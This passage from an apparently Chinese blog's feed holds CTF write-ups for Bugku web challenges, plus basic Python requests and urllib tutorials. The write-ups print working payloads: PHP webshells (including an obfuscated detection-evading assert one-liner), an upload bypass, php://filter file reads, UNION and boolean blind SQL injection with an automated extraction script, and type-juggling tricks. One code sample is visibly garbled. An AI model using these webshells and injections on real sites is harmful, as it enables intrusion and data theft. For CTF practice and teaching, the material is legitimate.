    <url>%2F2018%2F08%2F18%2FWriteup%2FWeb%2FWP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web7/ 源码12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 分析后发现，只要使uname的sha1和值与passwd的sha1的值相等即可， 但是同时他们两个的值又不能相等 那么构造数组get传参：?uname[]=1&amp;id=margin同时post传参：passwd[]=2 得到 flag{HACK_45hhs_213sDD} 这个和之前的前女友有点像，都是利用数组]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-文件上传2(湖湘杯)]]></title>
    <url>%2F2018%2F08%2F18%2FWriteup%2FWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-%E6%B9%96%E6%B9%98%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:9011/ 看大佬博客，直接构造的url，直接读取文件？？？？？？？ http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 然后base64解码 得到flag{e00f8931037cbdb25f6b1d82dfe5552f}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-求getshell]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-%E6%B1%82getshell%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web9/ 打开后发现 My name is margin,give me a image file not a php 上传一个php文件不让上传，那么BP抓包 经过测试，将 Content-Type: 后参数改大写，修改文件名后缀为 .php5 ，文件类型改为图片类型 image/jpg 可以获得flag 得到 KEY{bb35dc123820e}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-文件包含2]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49166/ 进入题目后发现这个页面，什么都没有 查看源代码 第一行发现1&lt;!-- upload.php --&gt; 访问 http://118.89.219.210:49166/index.php?file=upload.php 出现上传页面 - CASE 01 这种方法是直接利用命令system(&quot;ls&quot;);来查看目录找到flag 只能上传图片，对大小有限制，那么上传个图片马 1&lt;?php system("ls"); ?&gt; 上传后提示： 那么就访问upload/201808170638381043.jpg构造urlhttp://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg 发现后台把&lt;?php,?&gt;替换成了_,_ 那么用&lt;script&gt;标签绕过123&lt;script langulage=php&gt;system("ls");&lt;/script&gt; 再次上传，并打开文件所在地址 发现解析成功 页面出现如下内容 直接访问 this_is_th3_F14g_154f65sd4g35f4d6f43.txt 构造url:http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt 得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun} - CASE 02 这种方法是上传木马后利用中国菜刀 有了上一次的经验，这里直接：文件名 1.php;.jpg内容：1234&lt;script language=php&gt;echo 'aaaa';eval($_POST['aaaa']);&lt;/script&gt; 上传后访问http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg 发现成功显示了 aaaa 那么上菜刀 连接成功后 打开tx文件得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
        <tag>图片马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login3(SKCTF)]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-login3-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯： username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。 毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。 我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是： select password,username from users where username=”我们输入的使用者名称” 如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成 where username=’admin’ and (substring(database(),1,1)=’a’) 如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。 但是这道题过滤了and！ ！ ！ 尝试加上and返回：经过尝试发现还过滤了空格，逗号，等号，for 空格用括号代替，等号用&lt;&gt;(一种不等号)代替 那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则： 1^1=0 1^0=1 0^0=0 就是说只有两个不同的布林值运算结果为1，其他为零 不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。 首先说下这里我们要补上两个布林值，这个最后再说为什么。 先猜资料库名，基本语句 admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^0# 解释一下为什么，为了绕过空格过滤，用括号隔开，过滤了等号，用不等号&lt;&gt;代替，只要是布林值就可以。 mid()函式和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？ 这里用到了ascii()取ascii码值的函式，如果传入一个字串那么就会取第一个字元的字元的ascii码值，这就有了for的作用，并且mid()函式是可以只写from的表示从第几位往后的字串，我们将取出的字串在传入ascii()中取第一位，就完成了对单个字元的提取。 每个字元的ascii码判断是不是不等于给定的数字，会得到一个布林值(0或1)再与结尾的0进行运算。 如果资料库名的第一位的ascii码值不是97，where条件是username=’admin’^1^0 返回值是username does not exist! 如果资料库名的第一位的ascii码值是97，where条件是username=’admin’^0^0 返回值会是password error! 这就构成了布林报错注入。 有人可能疑问大部分的判断都是无用的，就是说可能从97尝试到120都是username does not exist!，那如何快速找到语句成立时的返回结果(password error!)。 这里就是最后^0的妙用了， 因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。 补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。 就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error! 资料库名最后可以得到是：blindsql 下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。 没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下 admin’^(select(1)from(admin))^1# 返回password error!说明猜对了 猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。 为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。 然后猜password的值，暴力猜解，与猜资料库类似： admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0# 得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag 1import requests str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/=" url="http://118.89.219.210:49167/index.php" r=requests.session() def databasere(): resutlt="" for i in range(30): fla = 0 for j in str_all: playlod="admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j print(resutlt) if fla == 0: break def password(): resutlt="" for i in range(40): fla=0 for j in str_all: playlod = "admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i 1),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j fla=1 print('**************************',resutlt) if fla==0: break #databasere() password()]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>基于布尔的SQL盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-细心]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-%E7%BB%86%E5%BF%83%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web13/ 进入后发现是一个404错误页面 参考大佬WP，查看robots.txt 发现有：User-agent: *Disallow: /resusl.php 访问/resusl.php后看到if ($_GET[x]==$password) 此处省略1w字 那么就要GET传参， （看大佬WP传了admin，可能是题目和管理员有关吧…..） 构造payload?x=admin 得到flag(ctf_0098_lkji-s)]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-web8]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-web8%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web8/ 打开后有源码，代码审计123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 可以看出得到flag的途径是ac的值不为空，并且f的值从文件fn中获取，并且ac的值要恒等于f的值 构造payload?ac=flags&amp;fn=flag.txt 得到This is flag: flag{3cfb7a90fc0de31}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-程序员本地网站]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/localhost/ 进入后提示从本地访问 那么BP抓包 加上这一行：X-Forwarded-For: 127.0.0.1 X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 得到flag{loc-al-h-o-st1}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-flag.php]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-flag.php%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/flagphp/ 进入题目后看到的是登录框，题目提示“点了login咋没反应，提示：hint” 参考网上的WP， GET传参，构造后的url：http://120.24.86.145:8002/flagphp/?hint 就得到源码了：1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 意思是当得到 unserialize (反序列化)后的$cookie这个ISecer全等于$KEY后显示 flag这里要注意，$KEY的值并不是$KEY=&#39;ISecer:www.isecer.com&#39;;所显示的，而是&quot;&quot;，即空 那么php脚本一行：123&lt;?php print_r(serialize("")); ?&gt; 得到结果：s:0:&quot;&quot;; BP抓包Go一下：得到flag{unserialize_by_virink}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-Cookies欺骗]]></title>
    <url>%2F2018%2F08%2F14%2FWriteup%2FWeb%2FWP-Bugku-Cookies%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[关于python requests.Session() 首先看到url上有base64编码解码后是 keys.txt url参数line是按行返回参考网上的脚本：12345678import requestss=requests.Session()url='http://120.24.86.145:8002/web11/index.php'for i in range(1,20): payload=&#123;'line':str(i),'filename':'aW5kZXgucGhw'&#125; a=s.get(url,params=payload).content content=str(a,encoding="utf-8") print(content) 得到源码：1234567891011121314151617181920212223242526272829303132333435error_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; bp抓包构造包：构造Cookie: margin=margin注意 filename 后的参数 keys.txt 要经过 base64 编码 得到：KEY{key_keys}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python_Requests模块初级使用]]></title>
    <url>%2F2018%2F08%2F13%2FPython-Requests%E6%A8%A1%E5%9D%97%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[发送请求先导入Requests模块1import requests 获取某个网页123456r = requests.get('url') #一个名为 r 的 Response 对象r = requests.post('url',data = &#123;'key':'value'&#125;) #发送一个 HTTP POST 请求r = requests.put('url',data = &#123;'key':'value'&#125;) #发送一个 HTTP PUT 请求r = requests.delete('url') #发送一个 HTTP DELETE 请求r = requests.head('url') #发送一个 HTTP HEAD 请求r = requests.options('url') #发送一个 HTTP OPTIONS 请求]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-这是一个神奇的登陆框]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9001/sql/ 寻找注入点，找到1&quot;双引号会报错 order by判断字段数：1&quot;order by 1,2,3-- 找表：1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--根据提示，得到表flag1，whoami 继续找列1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;-- 找字段1&quot; union select flag1,2 from flag1-- 得到Login_Name:ed6b28e684817d9efcaf802979e57aea flag{ed6b28e684817d9efcaf802979e57aea}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login1(SKCTF)]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-login1-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址：http://118.89.219.210:49163/ 本文转载自：https://delcoding.github.io/2018/03/bugku-writeup4/ 这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; ); 这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。 SKCTF{4Dm1n_HaV3_GreAt_p0w3R}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>SQL约束攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-多次]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-%E5%A4%9A%E6%AC%A1%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9004/]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-md5 collision(NUPT_CTF)]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-md5-collision-NUPT-CTF%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9009/md5.php md5 collision（MD5碰撞）：本段转自https://www.jianshu.com/p/2791e2fdadfd MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。 在PHP中的MD5中的0e的比较：PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 这里给出常用的0e开头的MD5：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 抓包测试得到flag{md5_collision_is_easy}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-前女友(SKCTF)]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)%2F</url>
    <content type="text"><![CDATA[题目链接：http://118.89.219.210:49162/ 打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码：123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样就得到答案了。 所以构造出参数：?v1[]=1&amp;v2[]=2&amp;v3[]=3url:http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3 得到SKCTF{Php_1s_tH3_B3St_L4NgUag3} 这里链接一道也是利用数组的题]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-字符?正则?]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99%2F</url>
    <content type="text"><![CDATA[题目代码：12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match("/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 可以看到/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i这一串正则表达式(关于正则点这里)能够构造出：?id=key1key22222key:/3/keyz; 构造url：http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz; 得到KEY{0x0SIOPh550afc} 正则表达的整理：1.表达式直接写出来的字符串直接利用，如key 2.“.”代表任意字符 3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以&apos;^&apos;开头，以&apos;$&apos;结束 4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束 5.[a-z]代表a-z中的任意一个字符 6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号 7./i代表大小写不敏感 8.{4-7}代表[0-9]中数字连续出现的次数是4-7次 9.\s匹配任意的空白符 10.\d 匹配数字 11.\b 匹配单词的开始或结束]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-过狗一句话]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:8010/ 送给大家一个过狗一句话：&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt; 搜索到的几种解法： 1. s=print_r(scandir(&apos;./&apos;)) http://120.24.86.145:8010/?s=print_r(scandir(&apos;./&apos;)) 2. s=print_r(glob(&quot;*.*&quot;)) http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;)) scandir()函数： scandir() 函数返回指定目录中的文件和目录的数组。glob()函数：glob() 函数返回匹配指定模式的文件名或目录。该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3抓取页面内容]]></title>
    <url>%2F2018%2F08%2F08%2Fpython3%E6%8A%93%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[环境：python3 最简单123import urllib.requestresponse = urllib.request.urlopen('http://python.org/')html = response.read() 使用request1234567891011121314151617#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except URLError as e: if hasattr(e, 'reason'): print('We failed to reach a server.') print('Reason: ', e.reason) elif hasattr(e, 'code'): print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)else: print("good!") print(response.read().decode("utf8")) 发送数据1234567891011121314151617181920#! /usr/bin/env python3 import urllib.parseimport urllib.request url = 'http://localhost/login.php'user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'values = &#123; 'act' : 'login', 'login[email]' : 'yzhang@i9i8.com', 'login[password]' : '123456' &#125; data = urllib.parse.urlencode(values)req = urllib.request.Request(url, data)req.add_header('Referer', 'http://www.python.org/')response = urllib.request.urlopen(req)the_page = response.read() print(the_page.decode("utf8")) 发送数据和header1234567891011121314151617181920#! /usr/bin/env python3 import urllib.parseimport urllib.request url = 'http://localhost/login.php'user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'values = &#123; 'act' : 'login', 'login[email]' : 'yzhang@i9i8.com', 'login[password]' : '123456' &#125;headers = &#123; 'User-Agent' : user_agent &#125; data = urllib.parse.urlencode(values)req = urllib.request.Request(url, data, headers)response = urllib.request.urlopen(req)the_page = response.read() print(the_page.decode("utf8")) HTTP错误12345678910#! /usr/bin/env python3 import urllib.request req = urllib.request.Request('http://www.python.org/fish.html')try: urllib.request.urlopen(req)except urllib.error.HTTPError as e: print(e.code) print(e.read().decode("utf8")) 异常处理112345678910111213141516#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLError, HTTPErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except HTTPError as e: print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)except URLError as e: print('We failed to reach a server.') print('Reason: ', e.reason)else: print("good!") print(response.read().decode("utf8")) 异常处理21234567891011121314151617#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except URLError as e: if hasattr(e, 'reason'): print('We failed to reach a server.') print('Reason: ', e.reason) elif hasattr(e, 'code'): print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)else: print("good!") print(response.read().decode("utf8")) HTTP认证12345678910111213141516171819202122232425262728#! /usr/bin/env python3 import urllib.request # create a password managerpassword_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm() # Add the username and password.# If we knew the realm, we could use it instead of None.top_level_url = "https://cms.tetx.com/"password_mgr.add_password(None, top_level_url, 'yzhang', 'cccddd') handler = urllib.request.HTTPBasicAuthHandler(password_mgr) # create "opener" (OpenerDirector instance)opener = urllib.request.build_opener(handler) # use the opener to fetch a URLa_url = "https://cms.tetx.com/"x = opener.open(a_url)print(x.read()) # Install the opener.# Now all calls to urllib.request.urlopen use our opener.urllib.request.install_opener(opener) a = urllib.request.urlopen(a_url).read().decode('utf8')print(a) 使用代理1234567891011#! /usr/bin/env python3 import urllib.request proxy_support = urllib.request.ProxyHandler(&#123;'sock5': 'localhost:1080'&#125;)opener = urllib.request.build_opener(proxy_support)urllib.request.install_opener(opener) a = urllib.request.urlopen("http://g.cn").read().decode("utf8")print(a) 超时1234567891011121314#! /usr/bin/env python3 import socketimport urllib.request # timeout in secondstimeout = 2socket.setdefaulttimeout(timeout) # this call to urllib.request.urlopen now uses the default timeout# we have set in the socket modulereq = urllib.request.Request('http://twitter.com/')a = urllib.request.urlopen(req).read()print(a)]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>抓取页面内容</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP_Bugku_变量1]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%8F%98%E9%87%8F1%2F</url>
    <content type="text"><![CDATA[参考文章：https://blog.csdn.net/anjiaowangmenghan/article/details/76460872 题目地址：http://120.24.86.145:8004/index1.php 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; ");&#125;?&gt; 注意最后的eval(&quot;var_dump($$args);参数args前有两个$$参考下面：所以只需要传一个全局变量就好构url：http://120.24.86.145:8004/index1.php?args=GLOBALS得到flag{92853051ab894a64f7865cf3c2128b34}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
